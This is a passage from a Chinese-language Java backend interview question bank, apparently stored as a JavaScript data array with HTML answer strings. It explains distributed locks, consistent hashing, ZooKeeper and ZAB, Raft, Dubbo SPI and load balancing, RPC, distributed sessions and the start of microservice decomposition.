        <li>日常用 ApplicationContext（Spring Boot 自动用，AnnotationConfigServletWebServerApplicationContext）。</li>
        <li>BeanFactory 极少直接用，只在资源极度受限（如 Applet）或特殊场景（延迟加载节省启动时间）用。</li>
      </ul>
      <p><strong>7. 面试标准答法</strong></p>
      <p>BeanFactory 是 IOC 顶层接口（基础 getBean，懒加载）；ApplicationContext 继承它并扩展（事件、国际化、资源、环境），预实例化 Bean（启动时创建）+ 自动注册 BeanPostProcessor（让 AOP/@Autowired 生效）。日常用 ApplicationContext。</p>`},

  // ============ 分布式 补充 ============
  {c:"分布式",d:"★★★",q:"分布式锁有哪些实现方案？各有什么优缺点？",
   a:`<ul>
        <li><strong>Redis（SETNX + 过期时间）</strong>：性能高、实现简单。缺点：需要考虑锁续期、误删、主从切换丢锁。生产用 Redisson（带看门狗续期）。</li>
        <li><strong>ZooKeeper（临时顺序节点）</strong>：可靠性高（CP，强一致），客户端宕机锁自动释放。缺点：性能比 Redis 低。</li>
        <li><strong>数据库（唯一索引 / for update）</strong>：实现简单。缺点：性能差、单点问题，不推荐。</li>
        <li><strong>etcd（Lease 租约）</strong>：和 ZK 类似，云原生场景常用。</li>
      </ul>
      <blockquote>选型：性能优先选 Redis（AP），强一致选 ZK/etcd（CP）。RedLock（红锁）是 Redis 作者提的多节点方案，但有争议，慎用。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 各方案对比</strong></p>
      <table><tr><th>方案</th><th>性能</th><th>可靠性</th><th>复杂度</th><th>特点</th></tr>
      <tr><td>Redis</td><td>高</td><td>中（AP，主从切换可能丢锁）</td><td>中</td><td>最常用，Redisson 带看门狗</td></tr>
      <tr><td>ZooKeeper</td><td>中</td><td>高（CP 强一致）</td><td>高</td><td>临时顺序节点，宕机自动释放</td></tr>
      <tr><td>etcd</td><td>中</td><td>高（CP，Raft）</td><td>高</td><td>云原生，K8s 用</td></tr>
      <tr><td>数据库</td><td>低</td><td>中</td><td>低</td><td>唯一索引/for update，不推荐</td></tr></table>
      <p><strong>2. Redis 分布式锁</strong></p>
      <ul>
        <li><strong>基础</strong>：SET key uuid NX EX 30（原子加锁）+ Lua 脚本判断 uuid 删除（原子解锁）。</li>
        <li><strong>问题</strong>：① 业务超时（看门狗续期）；② 误删（uuid 判断）；③ 主从切换丢锁（RedLock 有争议）。</li>
        <li><strong>Redisson</strong>：生产首选。看门狗（watchdog）每 1/3 过期时间续期；支持可重入（hash 结构）；支持 RedLock。</li>
      </ul>
      <p><strong>3. ZK 分布式锁</strong></p>
      <ul>
        <li>创建<strong>临时顺序节点</strong>（/lock/seq-0001），自己是最小节点则获锁，否则监听前一个节点。</li>
        <li>释放：删除自己的节点（或客户端断开，临时节点自动删除）。</li>
        <li>优点：<strong>CP 强一致</strong>、客户端宕机锁自动释放（临时节点）、公平锁（顺序节点排队）。</li>
        <li>缺点：性能比 Redis 低（ZK 写要多数确认）、羊群效应（优化：只监听前一个）。</li>
        <li>实现：Curator 的 InterProcessMutex。</li>
      </ul>
      <p><strong>4. etcd</strong></p>
      <p>Lease 租约（带 TTL）+事务（compare-and-set）。K8s 用 etcd 做协调。Raft 保证一致。</p>
      <p><strong>5. RedLock（争议）</strong></p>
      <p>Redis 作者提：向 N 个独立 Redis 实例加锁，过半成功才算成功。目的解决主从切换丢锁。但 Martin Kleppmann 批评（GC 停顿、时钟漂移导致不可靠）。生产慎用，优先 Redisson。</p>
      <p><strong>6. 面试标准答法</strong></p>
      <p>Redis（AP，性能高，Redisson看门狗续期/uuid防误删/主从丢锁用RedLock有争议）、ZK（CP强一致，临时顺序节点宕机自动释放，Curator）、etcd（Raft，云原生）、DB（唯一索引，不推荐）。选型：性能选Redis，强一致选ZK/etcd。</p>`},
  {c:"分布式",d:"★★★",q:"一致性哈希是什么？解决了什么问题？",
   a:`<p>一致性哈希是为了解决<strong>普通取模哈希在节点增减时大量数据迁移</strong>的问题。</p>
      <p>原理：把整个哈希空间想象成一个<strong>环</strong>（0 ~ 2^32-1），把节点和 key 都映射到环上，key 顺时针找最近的节点。节点增减时，只影响相邻一段的数据，其他数据不动。</p>
      <p><strong>问题</strong>：节点少时数据倾斜（都堆在某节点）。</p>
      <p><strong>解决</strong>：引入<strong>虚拟节点</strong>，一个真实节点对应多个虚拟节点（比如每个节点虚拟出 150 个），让节点在环上分布均匀。</p>
      <blockquote>应用：Redis Cluster（用槽位，类似思想）、负载均衡、分库分表路由。Memcached 客户端就靠一致性哈希。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 普通 hash 的问题</strong></p>
      <p>hash(key) % N 定位节点。当 N 变化（加节点/减节点），几乎所有 key 的位置都变了，<strong>大量数据要迁移</strong>。如缓存场景，节点从 3 增到 4，2/3 的缓存失效，全部回源 DB。</p>
      <p><strong>2. 一致性哈希原理</strong></p>
      <ul>
        <li>把哈希空间（0 ~ 2^32-1）首尾相连成一个<strong>环</strong>。</li>
        <li>用<strong>同样的哈希函数</strong>把节点（IP/名字）和 key 都映射到环上。</li>
        <li>key 沿环<strong>顺时针</strong>找最近的节点存储/查询。</li>
      </ul>
      <p><strong>3. 节点增减的影响（核心优势）</strong></p>
      <ul>
        <li><strong>加节点 X</strong>：只有 X 和前一个节点之间的 key 重新分配给 X，其他不变。</li>
        <li><strong>删节点</strong>：该节点的 key 顺时针落到下一个节点，其他不变。</li>
        <li>影响范围小（约 1/N 的数据迁移），不像普通 hash 几乎全迁。</li>
      </ul>
      <p><strong>4. 数据倾斜问题</strong></p>
      <p>节点少时（如3个），节点在环上分布不均，大量 key 可能都顺时针落到同一个节点（数据倾斜）。</p>
      <p><strong>5. 虚拟节点解决倾斜</strong></p>
      <p>每个真实节点对应<strong>多个虚拟节点</strong>（如 150 个，虚拟节点名 = 真实节点名 + 编号）。虚拟节点均匀分布在环上，key 先找到虚拟节点再映射到真实节点。虚拟节点越多，分布越均匀。</p>
      <p><strong>6. 应用</strong></p>
      <ul>
        <li><strong>Memcached</strong>：客户端用一致性哈希分片。</li>
        <li><strong>负载均衡</strong>：一致性 hash 算法（如 Nginx hash 模块）。</li>
        <li><strong>Redis Cluster</strong>：用 16384 槽（思想类似，但不是严格一致性哈希，是预分配槽）。</li>
        <li>分库分表路由、分布式存储（Cassandra）。</li>
      </ul>
      <p><strong>7. 面试标准答法</strong></p>
      <p>一致性哈希解决节点增减时大量数据迁移。把节点和key映射到哈希环，key顺时针找最近节点。节点增减只影响相邻段。虚拟节点（一真多虚）解决节点少时数据倾斜。用于缓存分片、负载均衡、分库分表。</p>`},
  {c:"分布式",d:"★★",q:"ZooKeeper 是什么？有什么用？",
   a:`<p>ZooKeeper 是一个<strong>分布式的协调服务</strong>（不是用来存业务数据的），本质是一个<strong>类似文件系统的树形数据结构</strong>（叫 znode）。</p>
      <p>核心功能：</p>
      <ul>
        <li><strong>数据存储</strong>：znode 可以存少量数据（1MB 以内）。</li>
        <li><strong>监听机制（Watch）</strong>：客户端可以监听节点变化，节点变了通知。</li>
        <li><strong>临时节点</strong>：客户端断开后自动删除（用于服务注册、分布式锁）。</li>
        <li><strong>顺序节点</strong>：自动加序号（用于分布式锁排队）。</li>
      </ul>
      <p>典型应用：注册中心（Dubbo 老版本）、分布式锁、配置管理、Leader 选举、Master 选举。</p>
      <blockquote>ZK 是 CP 系统（强一致），适合需要强一致性的协调场景，不适合做高并发数据存储。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. ZK 是什么</strong></p>
      <p>分布式协调服务（Apache）。本质是一个<strong>树形数据结构</strong>（类似文件系统），每个节点叫 znode，可存少量数据（&lt;1MB）。通过 ZAB 协议保证各节点数据强一致（CP）。</p>
      <p><strong>2. 数据模型：znode 树</strong></p>
      <ul>
        <li>树形结构，路径标识（/app1/config）。</li>
        <li><strong>持久节点</strong>：创建后一直存在，直到主动删除。</li>
        <li><strong>持久顺序节点</strong>：持久 + 自动加序号（/lock-0001）。</li>
        <li><strong>临时节点</strong>：客户端会话（session）断开自动删除。<strong>用于服务注册、分布式锁</strong>。</li>
        <li><strong>临时顺序节点</strong>：临时 + 顺序。<strong>用于分布式锁排队</strong>。</li>
        <li><strong>容器节点</strong>：子节点没了自动删（3.5.3+）。</li>
      </ul>
      <p><strong>3. 核心机制：Watch 监听</strong></p>
      <p>客户端可对节点注册 Watch（一次性触发）：节点创建/删除/数据变化/子节点变化时，ZK 通知客户端。用于<strong>服务发现、配置变更、锁等待</strong>。注意是一次性的，触发后要重新注册。</p>
      <p><strong>4. 典型应用</strong></p>
      <ul>
        <li><strong>注册中心</strong>：Dubbo 老版本用 ZK（临时节点+Watch 实现注册发现）。</li>
        <li><strong>分布式锁</strong>：临时顺序节点 + Watch 前一个节点。</li>
        <li><strong>配置管理</strong>：配置存 znode，变更通过 Watch 通知。</li>
        <li><strong>Leader/Master 选举</strong>：多个节点创建同一个临时节点，成功的为 Leader（其他 Watch 它）。</li>
        <li><strong>分布式协调</strong>：Kafka（元数据）、Hadoop/HBase（HA 协调）。</li>
      </ul>
      <p><strong>5. ZK 的特点</strong></p>
      <ul>
        <li><strong>CP</strong>：强一致（ZAB 协议，过半写）。不适合存大量数据（性能低）。</li>
        <li><strong>顺序一致性</strong>：客户端命令按顺序执行。</li>
        <li><strong>高可用</strong>：集群（Leader + Follower + Observer）。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>ZK 是分布式协调服务（CP强一致），树形znode结构。节点类型：持久/临时/顺序。Watch一次性监听变化。应用：注册中心(Dubbo老)、分布式锁(临时顺序节点)、配置管理、Leader选举。不存大数据。</p>`},
  {c:"分布式",d:"★★",q:"ZAB 协议是什么？",
   a:`<p>ZAB（ZooKeeper Atomic Broadcast）是 ZooKeeper 自己设计的<strong>原子广播协议</strong>，用来保证集群各节点数据一致。包含两个阶段：</p>
      <ul>
        <li><strong>消息广播</strong>（正常运行）：类似两阶段提交。Leader 收到写请求，生成事务，发给所有 Follower，过半（包括自己）确认就提交。注意是<strong>过半</strong>不是全部。</li>
        <li><strong>崩溃恢复</strong>（Leader 挂了）：进入选举，选出新 Leader（数据最新的、zxid 最大的），同步数据后恢复服务。</li>
      </ul>
      <p>Leader 选举规则：先比 epoch（任期），再比 zxid（事务 id，越大数据越新），最后比 myid（节点编号）。</p>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. ZAB 是什么</strong></p>
      <p>ZooKeeper Atomic Broadcast，ZK 专用的<strong>原子广播协议</strong>，保证集群所有节点数据一致（强一致）。和 Paxos/Raft 类似但不同（专为 ZK 的主备模式设计）。</p>
      <p><strong>2. 两个核心阶段</strong></p>
      <p><strong>① 消息广播（Broadcast，正常运行）</strong>：类似简化版两阶段提交。</p>
      <ul>
        <li>Leader 收到写请求，生成事务（zxid），写入自己日志。</li>
        <li>发给所有 Follower（PROPOSAL）。</li>
        <li>Follower 写日志，回复 ACK。</li>
        <li>Leader 收到<strong>过半 ACK</strong>（包括自己）就 COMMIT，发 COMMIT 给 Follower。</li>
        <li>注意：是<strong>过半</strong>不是全部（性能 vs 一致性权衡）。</li>
      </ul>
      <p><strong>② 崩溃恢复（Recovery，Leader 挂或启动）</strong>：选举新 Leader + 数据同步。</p>
      <p><strong>3. zxid（事务 ID）</strong></p>
      <p>64 位 = <strong>epoch（32位高，任期号）+ counter（32位低，事务序号）</strong>。每个事务递增。epoch 标识 Leader 任期（换 Leader 则 +1）。zxid 越大，事务越新。</p>
      <p><strong>4. Leader 选举流程</strong></p>
      <ul>
        <li>节点进入 LOOKING 状态，广播自己的（myid, zxid）。</li>
        <li>收到别人的投票，按规则比较选优：<strong>先比 zxid 大的（数据新）→ 再比 myid 大的</strong>。</li>
        <li>过半节点同意某节点，它成为 Leader（LEADING），其他变 FOLLOWING。</li>
      </ul>
      <p>关键：优先选 zxid 大的（数据最新），保证已提交事务不丢。</p>
      <p><strong>5. 数据同步</strong></p>
      <p>新 Leader 选出后，把最新的数据同步给所有 Follower，保证一致后才对外服务。</p>
      <p><strong>6. ZAB vs Raft vs Paxos</strong></p>
      <ul>
        <li>Paxos：通用一致性算法，难理解。</li>
        <li>Raft：易理解，Leader + 日志复制 + 过半提交。etcd/Consul 用。</li>
        <li>ZAB：ZK 专用，主备模式，广播 + 崩溃恢复。和 Raft 思想接近（Leader、过半）。</li>
      </ul>
      <p><strong>7. 面试标准答法</strong></p>
      <p>ZAB 是ZK的原子广播协议，保证数据一致。两阶段：消息广播(Leader发proposal，过半ACK则commit)和崩溃恢复(Leader挂了选举)。zxid=epoch+counter。选举规则：先比zxid大(数据新)再比myid大。和Raft类似(Leader+过半)。</p>`},
  {c:"分布式",d:"★★",q:"Raft 算法是什么？",
   a:`<p>Raft 是一个<strong>易于理解的一致性算法</strong>（比 Paxos 好懂），用于分布式系统保证多节点数据一致。etcd、Consul 都用它。</p>
      <p>三个核心机制：</p>
      <ul>
        <li><strong>Leader 选举</strong>：节点有三种状态（Follower/Candidate/Leader）。Leader 挂了，Follower 超时变 Candidate，发起投票，获得多数票就成为新 Leader。</li>
        <li><strong>日志复制</strong>：所有写操作都经过 Leader，Leader 把日志复制到 Follower，过半成功才提交。</li>
        <li><strong>安全性</strong>：保证已提交的日志不会丢失，新 Leader 必须包含所有已提交的日志。</li>
      </ul>
      <blockquote>和 Paxos 比：Raft 把流程拆成清晰的几个模块（选举、日志、安全），工程实现更容易，是现在主流。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. Raft 是什么</strong></p>
      <p>一致性算法（共识算法），保证多节点数据一致。由斯坦福提出，核心目标是<strong>易理解</strong>（相比 Paxos）。etcd（K8s 用）、Consul、TiKV 都用 Raft。</p>
      <p><strong>2. 三种节点状态</strong></p>
      <ul>
        <li><strong>Follower</strong>：被动接收 Leader 的请求。</li>
        <li><strong>Candidate</strong>：候选人，发起选举竞争 Leader。</li>
        <li><strong>Leader</strong>：处理所有客户端请求，复制日志给 Follower。</li>
      </ul>
      <p>状态转换：Follower →（选举超时）→ Candidate →（获多数票）→ Leader /（被别人当选）→ Follower。</p>
      <p><strong>3. 核心机制一：Leader 选举</strong></p>
      <ul>
        <li>Leader 定期发心跳（AppendEntries）给 Follower 维持权威。</li>
        <li>Follower <strong>选举超时</strong>（没收到心跳）→ 变 Candidate，term+1，给自己投票，向其他节点发 RequestVote。</li>
        <li>获得<strong>多数票</strong>的 Candidate 成为 Leader（每个节点一个任期只投一票，防多选）。</li>
        <li>超时随机化（150-300ms）避免多个节点同时发起选举（split vote）。</li>
      </ul>
      <p><strong>4. 核心机制二：日志复制</strong></p>
      <ul>
        <li>客户端写请求到 Leader。</li>
        <li>Leader 写入本地日志（uncommitted）。</li>
        <li>通过 AppendEntries 复制给所有 Follower。</li>
        <li><strong>过半 Follower 确认</strong> → Leader 提交（committed）→ 响应客户端 → 通知 Follower 提交。</li>
      </ul>
      <p><strong>5. 核心机制三：安全性（保证一致）</strong></p>
      <ul>
        <li><strong>选举限制</strong>：日志最新的（up-to-date）才能当选，保证新 Leader 包含所有已提交日志。</li>
        <li><strong>提交限制</strongi>：Leader 只提交当前 term 的日志（间接提交旧日志）。</li>
        <li>保证：已提交的日志不会丢失、不会被覆盖。</li>
      </ul>
      <p><strong>6. term（任期）</strong></p>
      <p>单调递增的整数，每次选举 +1。每个 term 最多一个 Leader。过期 term 的 Leader 会被降级。</p>
      <p><strong>7. Raft vs Paxos</strong></p>
      <ul>
        <li>Paxos：通用、强大但难理解、难实现。</li>
        <li>Raft：功能等价，但拆成 Leader选举/日志复制/安全 三个清晰模块，易理解易实现。<strong>工程主流</strong>。</li>
      </ul>
      <p><strong>8. 面试标准答法</strong></p>
      <p>Raft 是易理解的一致性算法（etcd/Consul用）。三状态：Follower/Candidate/Leader。三机制：①选举(Follower超时变Candidate，获多数票当Leader，随机超时防冲突)；②日志复制(Leader写→复制Follower→过半提交)；③安全性(新Leader含所有已提交日志)。term任期。比Paxos易实现。</p>`},
  {c:"分布式",d:"★★",q:"Dubbo 的 SPI 机制和 Java SPI 有什么区别？",
   a:`<p><strong>Java SPI</strong>：用 ServiceLoader 加载 META-INF/services 下所有实现类，<strong>一次性全部实例化</strong>，浪费资源，没法按需选择。</p>
      <p><strong>Dubbo SPI</strong>：</p>
      <ul>
        <li>配置在 META-INF/dubbo 目录下，格式是 <code>key=实现类</code>。</li>
        <li><strong>按需加载</strong>：只加载你用到的那个实现（通过 key）。</li>
        <li>支持 <strong>IOC</strong>（实现类里能注入其他扩展点）和 <strong>AOP</strong>（Wrapper 包装）。</li>
        <li>支持 <strong>@Adaptive 自适应扩展</strong>：运行时根据参数动态选择实现。</li>
      </ul>
      <blockquote>Dubbo 的高度扩展性就靠 SPI。比如负载均衡、序列化、注册中心协议，都可以通过 SPI 灵活替换。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. Java SPI 的局限</strong></p>
      <ul>
        <li>配置在 META-INF/services，文件名是接口全限定名，内容是实现类全限定名。</li>
        <li>ServiceLoader.load <strong>一次性实例化所有实现</strong>，无法按需加载（浪费资源）。</li>
        <li>无法选择某个实现（全加载）。</li>
        <li>不支持 IOC/AOP。</li>
        <li>实现失败难定位。</li>
      </ul>
      <p><strong>2. Dubbo SPI 的改进</strong></p>
      <ul>
        <li><strong>配置格式</strong>：META-INF/dubbo/（或 dubbo/internal/），文件名是接口全限定名，内容是 <code>key=实现类全限定名</code>（如 <code>random=org.apache.dubbo.rpc.loadbalance.RandomLoadBalance</code>）。</li>
        <li><strong>按需加载</strong>：ExtensionLoader.getExtensionLoader(接口.class).getExtension("random")，只加载并实例化指定 key 的实现。</li>
        <li><strong>IOC（依赖注入）</strong>：扩展点的 setter 方法会被自动注入其他扩展（如 LoadBalance 注入）。</li>
        <li><strong>AOP（Wrapper 包装）</strong>：用 Wrapper 类（构造参数是接口类型）包装扩展，类似装饰器，做切面（如日志、监控）。多个 Wrapper 自动嵌套。</li>
        <li><strong>@Adaptive 自适应扩展</strong>：运行时根据参数（如 URL 中的 loadbalance 参数）动态选择实现。生成代理类（@Adaptive 注解的方法）。Dubbo 的很多组件（Protocol、LoadBalance、Serialization）是 Adaptive 的。</li>
        <li><strong>@Activate 自动激活</strong>：按条件（group、key）自动激活扩展（如 Filter 链）。</li>
      </ul>
      <p><strong>3. 应用</strong></p>
      <p>Dubbo 所有核心组件（Protocol、LoadBalance、Serialization、Registry、Cluster、Filter）都是 SPI 扩展点。用户可写自己的实现注册进去，无缝替换。这是 Dubbo<strong>高度可扩展</strong>的基础。</p>
      <p><strong>4. 面试标准答法</strong></p>
      <p>Java SPI 全量实例化无法按需选、不支持IOC/AOP。Dubbo SPI：key=实现类按需加载、支持IOC(setter注入)、AOP(Wrapper包装)、@Adaptive自适应(运行时按URL参数动态选)、@Activate条件激活。Dubbo核心组件都是SPI扩展点。</p>`},
  {c:"分布式",d:"★★",q:"Dubbo 有哪些负载均衡策略？",
   a:`<ul>
        <li><strong>Random（加权随机，默认）</strong>：按权重随机选。调用量越大越均匀。</li>
        <li><strong>RoundRobin（加权轮询）</strong>：按权重轮询，存在慢的提供者累积请求的问题。</li>
        <li><strong>LeastActive（最少活跃数）</strong>：优先调用活跃数少的（处理快的多分点活），越快的机器分配越多。</li>
        <li><strong>ConsistentHash（一致性哈希）</strong>：相同参数的请求总是发到同一提供者（除非提供者挂了），适合有状态场景。</li>
        <li><strong>ShortestResponse（最短响应，2.7+）</strong>：优先调响应快的。</li>
      </ul>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 五种负载均衡策略（LoadBalance SPI）</strong></p>
      <ul>
        <li><strong>RandomLoadBalance（加权随机，默认）</strong>：按权重设置概率。调用量越大越均匀。权重可在运行时动态调整（如根据负载）。最常用。</li>
        <li><strong>RoundRobinLoadBalance（加权轮询）</strong>：按权重比例轮询。缺点：慢的提供者会累积请求（处理慢导致更多请求堆积，越来越慢）。</li>
        <li><strong>LeastActiveLoadBalance（最少活跃数）</strong>：统计每个提供者的活跃请求数（收到+1，完成-1），优先选活跃数少的。效果：<strong>处理快的机器分到更多请求</strong>（自动均衡处理能力差异），慢的少分。</li>
        <li><strong>ConsistentHashLoadBalance（一致性哈希）</strong>：相同参数（方法参数 hash）的请求<strong>总是发到同一提供者</strong>（除非它挂了）。适合<strong>有状态</strong>场景（如利用本地缓存）。缺点：节点变化时部分请求重路由。</li>
        <li><strong>ShortestResponseLoadBalance（最短响应，2.7+）</strong>：统计响应时间，优先调<strong>响应快</strong>的。综合了 LeastActive 的思想，更关注实际响应耗时。</li>
      </ul>
      <p><strong>2. 权重（weight）</strong></p>
      <p>可在注册中心动态配置（如给性能好的机器配高权重），Dubbo 运行时生效。也可用于<strong>灰度</strong>（新版本低权重，逐步加大）。</p>
      <p><strong>3. 配置方式</strong></p>
      <pre><code>// 服务端或消费端配置
@DubboReference(loadbalance = "roundrobin")
// 或全局
dubbo.consumer.loadbalance=leastactive</code></pre>
      <p><strong>4. 选型建议</strong></p>
      <ul>
        <li>默认 Random 即可（大部分场景）。</li>
        <li>机器性能差异大：LeastActive（自动按能力分配）。</li>
        <li>有状态/缓存：ConsistentHash。</li>
        <li>追求低延迟：ShortestResponse。</li>
      </ul>
      <p><strong>5. 面试标准答法</strong></p>
      <p>五种：Random(加权随机默认)、RoundRobin(加权轮询，慢节点累积问题)、LeastActive(最少活跃数，快的多分)、ConsistentHash(一致性哈希，相同参数同节点，有状态)、ShortestResponse(最短响应2.7+)。权重可动态调(灰度)。</p>`},
  {c:"分布式",d:"★★",q:"RPC 是什么？原理是怎样的？",
   a:`<p><strong>RPC（Remote Procedure Call）远程过程调用</strong>，让你像调本地方法一样调远程服务器的方法。Dubbo、gRPC 都是 RPC 框架。</p>
      <p>核心流程：</p>
      <ol>
        <li>客户端调用接口方法（其实是调<strong>代理对象</strong>）。</li>
        <li>代理把方法名、参数<strong>序列化</strong>成二进制，通过网络发给服务端。</li>
        <li>服务端<strong>反序列化</strong>，找到对应实现，执行方法。</li>
        <li>把结果序列化后返回。</li>
        <li>客户端代理反序列化结果，返回给调用方。</li>
      </ol>
      <blockquote>和 HTTP 调用（Feign/RestTemplate）比：RPC 用自定义协议（如 Dubbo）+ 二进制序列化（Hessian），更高效、更适合内部服务调用。HTTP 更通用、跨语言友好。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. RPC 是什么</strong></p>
      <p>Remote Procedure Call，远程过程调用。让程序<strong>像调用本地方法一样调用远程服务器的方法</strong>，屏蔽网络细节。Dubbo、gRPC、Thrift、Motan 都是 RPC 框架。</p>
      <p><strong>2. 核心原理（5 个角色）</strong></p>
      <ul>
        <li><strong>Client（调用方）</strong>：发起调用。</li>
        <li><strong>Client Stub（客户端存根/代理）</strong>：封装网络调用，对调用方透明。</li>
        <li><strong>网络传输</strong>：TCP/HTTP，序列化后的数据。</li>
        <li><strong>Server Stub（服务端存根）</strong>：接收请求，反序列化，调用真实方法。</li>
        <li><strong>Server（服务方）</strong>：真实业务实现。</li>
      </ul>
      <p><strong>3. 调用流程</strong></p>
      <ol>
        <li>客户端调 interface.method(args)，实际调<strong>动态代理对象</strong>。</li>
        <li>代理（Stub）把<strong>接口名+方法名+参数类型+参数值</strong>序列化（如 Hessian/Protobuf）。</li>
        <li>通过网络（TCP 长连接）发给服务端。</li>
        <li>服务端 Stub 接收，反序列化。</li>
        <li>根据接口名找到实现（注册的服务表），反射调用 method。</li>
        <li>执行业务方法，得到返回值。</li>
        <li>结果序列化，通过网络返回。</li>
        <li>客户端 Stub 接收反序列化，返回给调用方。</li>
      </ol>
      <p>对调用方来说，和调本地方法一样（代理屏蔽了网络）。</p>
      <p><strong>4. 关键技术点</strong></p>
      <ul>
        <li><strong>动态代理</strong>：客户端生成接口的代理（JDK/CGLIB），拦截方法调用转网络请求。</li>
        <li><strong>序列化</strong>：对象转字节。Hessian（Dubbo 默认）、Protobuf（gRPC）、Kryo、JSON。二进制比 JSON 小且快。</li>
        <li><strong>网络通信</strong>：Netty（NIO）长连接，自定义协议（Dubbo 协议头+body）。比 HTTP 轻量。</li>
        <li><strong>服务注册发现</strong>：注册中心（Nacos/ZK）管理服务地址。</li>
        <li><strong>负载均衡、容错</strong>：选实例、失败重试/切换。</li>
      </ul>
      <p><strong>5. RPC vs HTTP（Feign）</strong></p>
      <ul>
        <li><strong>RPC</strong>：自定义协议 + 二进制序列化，高效紧凑，适合<strong>内部服务</strong>调用。但跨语言、调试不如 HTTP 方便。</li>
        <li><strong>HTTP（Feign/RestTemplate）</strong>：标准 HTTP + JSON，通用、跨语言、易调试，但性能略低。适合开放 API、跨语言。</li>
        <li>gRPC：基于 HTTP/2 + Protobuf，兼顾性能和标准，跨语言好。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>RPC是远程过程调用（像调本地方法调远程）。流程：客户端代理→序列化(接口/方法/参数)→网络(TCP/Netty)→服务端反序列化→反射调用→结果序列化返回。关键技术：动态代理、序列化(Hessian/Protobuf)、Netty、注册发现。RPC比HTTP高效适合内部，HTTP通用跨语言。</p>`},
  {c:"分布式",d:"★★",q:"分布式 Session 怎么解决？",
   a:`<p>单体应用用 HttpSession 没问题，分布式（多台服务器）下，请求可能分到不同机器，Session 不共享。</p>
      <p>解决方案：</p>
      <ul>
        <li><strong>Session 粘性（Nginx IP hash）</strong>：同一用户固定到同一台机器。简单，但机器挂了 Session 丢失。</li>
        <li><strong>Session 复制</strong>：各服务器同步 Session。机器多时性能差，不推荐。</li>
        <li><strong>集中存储（推荐）</strong>：Session 存到 Redis 等共享存储，Spring 提供 spring-session。</li>
        <li><strong>不用 Session（推荐）</strong>：用无状态的 Token/JWT，客户端保存，服务端不存。</li>
      </ul>
      <blockquote>现在主流是"去 Session 化"用 JWT，或者把 Session 放 Redis。后者改动小，前者更符合微服务架构。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 问题</strong></p>
      <p>单体应用 Session 存在服务器内存（HttpSession）。多台服务器（负载均衡）时，用户第一次登录请求到 A 服务器（Session 存 A），第二次请求分到 B 服务器（B 没这个 Session），用户要重新登录。Session <strong>不共享</strong>。</p>
      <p><strong>2. 方案一：Session 粘性（Sticky Session）</strong></p>
      <ul>
        <li>负载均衡器（Nginx）按 IP hash 或 Cookie 把同一用户<strong>固定路由到同一台服务器</strong>。</li>
        <li>优点：简单，Session 还在本地。</li>
        <li>缺点：<strong>服务器挂了 Session 丢失</strong>（用户重新登录）、扩容不灵活、负载不均。</li>
      </ul>
      <p><strong>3. 方案二：Session 复制（Tomcat 集群）</strong></p>
      <ul>
        <li>各服务器间<strong>同步 Session</strong>（广播/multicast）。</li>
        <li>缺点：机器多时<strong>网络和内存开销大</strong>、性能差。基本不用。</li>
      </ul>
      <p><strong>4. 方案三：集中存储（推荐，Spring Session + Redis）</strong></p>
      <ul>
        <li>Session 不存本地，统一存到 <strong>Redis</strong>（或 DB）。所有服务器共享。</li>
        <li>Spring Session 无缝替换 HttpSession（透明），代码几乎不改（@EnableRedisHttpSession）。</li>
        <li>优点：共享、可扩展、服务器挂了 Session 不丢。缺点：依赖 Redis。</li>
        <li>改动小，适合老项目迁移。</li>
      </ul>
      <p><strong>5. 方案四：无状态 Token/JWT（推荐，微服务主流）</strong></p>
      <ul>
        <li>彻底不用 Session。登录后服务端签发 <strong>JWT</strong>（含用户信息 + 签名），客户端保存（Cookie/localStorage），每次请求带在 Header。</li>
        <li>服务端<strong>无状态</strong>（不存），只需验签。</li>
        <li>优点：天然分布式友好、易扩展、减少服务端存储。缺点：JWT 签发后难主动失效（要配合黑名单）、Payload 不可放敏感信息。</li>
        <li>微服务、前后端分离、移动端首选。</li>
      </ul>
      <p><strong>6. 选型</strong></p>
      <ul>
        <li>新项目/微服务：JWT。</li>
        <li>老项目改造：Spring Session + Redis。</li>
        <li>粘性/复制：基本不用。</li>
      </ul>
      <p><strong>7. 面试标准答法</strong></p>
      <p>分布式Session问题（多服务器不共享）。方案：①粘性(Nginx IP hash固定到一台，挂了丢)；②复制(同步，性能差)；③集中存储(Session存Redis，SpringSession推荐)；④JWT无状态(客户端保存，服务端验签，微服务主流)。</p>`},
  {c:"分布式",d:"★★",q:"微服务怎么拆分？有什么原则？",
   a:`<p>拆分原则：</p>
      <ul>
        <li><strong>按业务能力拆</strong>：每个微服务对应一个独立的业务领域（订单、用户、商品），这是最主流的。可参考 DDD（领域驱动设计）。</li>
        <li><strong>单一职责</strong>：一个服务只做一件事，高内聚低耦合。</li>
        <li><strong>独立数据库</strong>：每个服务有自己的数据库，不共享，通过 API 通信。</li>
        <li><strong>粒度适中</strong>：别太细（服务太多难管理、调用链长），也别太粗（失去拆分意义）。能独立部署、独立扩展为准。</li>
        <li><strong>避免循环依赖</strong>：服务间依赖要清晰，最好单向。</li>
      </ul>
      <blockquote>拆分不是越细越好，团队规模、运维能力也要考虑。康威定律：系统结构会符合组织沟通结构。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 拆分维度</strong></p>
      <ul>
        <li><strong>纵向（按业务/领域）</strong>：按业务能力拆。订单、用户、商品、支付、库存。每个服务对应一个<strong>业务领域</strong>（参考 DDD 限界上下文）。最主流。</li>
        <li><strong>横向（按技术/层）</strong>：按技术职责拆（如 API 层、业务层、数据层）。一般不推荐（破坏业务内聚）。</li>
      </ul>
      <p><strong>2. 核心原则</strong></p>
      <ul>
        <li><strong>单一职责（SRP）</strong>：一个服务只做一件事，高内聚低耦合。</li>
        <li><strong>独立数据库</strong>：每个服务有自己的库，<strong>不共享数据库</strong>（数据共享是耦合之源），通过 API/RPC/事件通信。这叫"Database per service"。</li>
